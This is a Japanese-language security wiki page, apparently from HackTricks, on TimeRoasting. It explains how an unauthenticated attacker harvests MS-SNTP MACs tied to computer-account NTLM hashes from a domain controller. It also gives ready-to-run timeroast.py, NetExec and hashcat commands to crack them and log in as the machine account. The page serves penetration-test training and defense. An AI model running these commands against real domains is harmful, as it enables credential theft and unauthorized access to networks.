# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting は、legacy MS-SNTP authentication extension を悪用します。MS-SNTP では、client が任意の computer account RID を埋め込んだ 68-byte request を送信できます。domain controller は、computer account の NTLM hash (MD4) を key として使用し、response に対する MAC を計算して返します。<sup>[[1]](#references)</sup> Attackers は、認証なしでこれらの MS-SNTP MAC を収集し、offline で crack できます (Hashcat mode 31300)。これにより、computer account passwords を復元できます。<sup>[[2]](#references)</sup>

詳細については、official MS-SNTP spec の section 3.1.5.1 "Authentication Request Behavior" および 4 "Protocol Examples" を参照してください。<sup>[[1]](#references)</sup>
![TimeRoasting: 詳細については、official MS-SNTP spec の section 3.1.5.1 "Authentication Request Behavior" および 4 "Protocol Examples" を参照してください](../../images/Pasted%20image%2020250709114508.png)
ExtendedAuthenticatorSupported ADM element が false の場合、client は 68-byte request を送信し、authenticator の Key Identifier subfield の least significant 31 bits に RID を埋め込みます。<sup>[[1]](#references)</sup>

> ExtendedAuthenticatorSupported ADM element が false の場合、client MUST construct a Client NTP Request message. Client NTP Request message の length は 68 bytes です。client は section 2.2.1 の説明に従って Client NTP Request message の Authenticator field を設定し、RID value の least significant 31 bits を authenticator の Key Identifier subfield の least significant 31 bits に書き込み、続いて Key Selector value を Key Identifier subfield の most significant bit に書き込みます。<sup>[[1]](#references)</sup>

section 4 (Protocol Examples) より:

> request を受信した後、server は受信した message size が 68 bytes であることを検証します。受信した message size が 68 bytes であると仮定すると、server は受信した message から RID を抽出します。server はそれを使用して、NetrLogonComputeServerDigest method ([MS-NRPC] section 3.5.4.8.2 に規定) を呼び出し、crypto-checksums を計算します。また、section 3.2.5 に従い、受信した message の Key Identifier subfield の most significant bit に基づいて crypto-checksum を選択します。その後、server は response を client に送信し、Key Identifier field を 0 に設定し、Crypto-Checksum field に計算した crypto-checksum を設定します。<sup>[[1]](#references)</sup>

crypto-checksum は MD5-based であり (3.2.5.1.1 を参照)、offline で crack できるため、roasting attack が可能になります。<sup>[[1]](#references)</sup>

## 攻撃方法

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort による Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcatを使った実践的な攻撃（unauth）

- NetExecは、unauthenticatedでcomputer RIDのMS-SNTP MACを列挙・収集し、crackingの準備が整った$sntp-ms$ hashを出力できます:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat モード 31300（MS-SNTP MAC）でオフライン crack:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 復元された平文はコンピューターアカウントのパスワードに対応します。NTLMが無効になっている場合は、Kerberos (-k) を使用してマシンアカウントとして直接試します：
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
運用上のヒント
- Kerberos の前に正確な時刻同期を確保します: `sudo ntpdate <dc_fqdn>`
- 必要に応じて、AD realm 用の krb5.conf を生成します: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 認証済み foothold を取得したら、後で LDAP/BloodHound を使用して RID を principals にマッピングします。

## 参考資料

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – 公式ドキュメント](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
